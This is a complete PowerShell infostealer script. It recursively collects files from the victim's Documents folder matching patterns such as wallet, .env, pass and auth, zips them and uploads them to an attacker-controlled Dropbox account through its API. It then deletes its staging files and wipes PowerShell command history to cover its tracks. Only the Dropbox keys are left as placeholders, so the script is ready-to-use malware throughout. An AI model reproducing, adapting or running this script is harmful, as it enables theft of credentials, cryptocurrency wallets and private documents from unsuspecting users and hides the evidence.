# directory to steal from (ALL SUBDIRECTORIES INSIDE AS WELL)
$s=$env:USERPROFILE+"\Documents\*";
# filetypes to exfiltrate
$fileTypes="*.txt","*wallet*","*.env","*.x*","*.doc*","*pass*","*auth*";
##############################################################################################
#                  Dropbox API values: Follow read.me tutorial to get these!                 #
##############################################################################################
# refresh_token
$r="REFRESH_TOKEN_HERE";
# App key
$u = 'APP_KEY_HERE';
# App secret
$p = 'APP_SECRET_HERE';
# do not touch below this line unless you know what you're doing
$ds=$env:TMP+"\cpy";$n = 0;$mb = 0;if(Test-Path $ds){rm $ds -Fo -R;}GCI $s -R -I $fileTypes|%{$sz = ((GCI $_.FullName).length/1MB);if($size -lt 100){$mb+=$sz;if($mb -ge 100){$mb = 0;$n++;}ROBOCOPY $_.Directory ("$ds\$n\") $_.Name /MT 128 |Out-Null;}}
$a=(Invoke-RestMethod https://api.dropbox.com/oauth2/token -Method Post -Body @{grant_type = "refresh_token";refresh_token = $r;} -Headers @{"Authorization" = "Basic "+ [System.Convert]::ToBase64String([System.Text.Encoding]::ASCII.GetBytes("${u}:${p}"));"Content-Type" = "application/x-www-form-urlencoded";}).access_token;
Add-Type -AssemblyName System.IO.Compression.Filesystem;$d=get-date -f MM-dd-yyyy;$t=get-date -f HH-MM-ss;for($i = 0;$i -le $n;$i++){$z="$env:TMP\$env:USERNAME-$i-$t.zip";[System.IO.Compression.ZipFile]::CreateFromDirectory("$ds\$i\",$z,0,$false);
Invoke-RestMethod https://content.dropboxapi.com/2/files/upload -Method Post -InFile $z -Headers @{"Authorization"="Bearer $a";"Content-Type"="application/octet-stream";"Dropbox-API-Arg"="{`"path`":`"/$(hostname)-$env:USERNAME/$d/$env:USERNAME-$i-$t.zip`",`"mode`":`"add`",`"autorename`":true,`"mute`":false}";}|Out-Null;}
rm $ds -Fo -R;for($i = 0;$i -le $n;$i++){rm "$env:TMP\$env:USERNAME-$i-$t.zip" -Fo;}Clear-History;rm "$env:APPDATA\Microsoft\Windows\PowerShell\PSReadLine\*" -Fo;exit;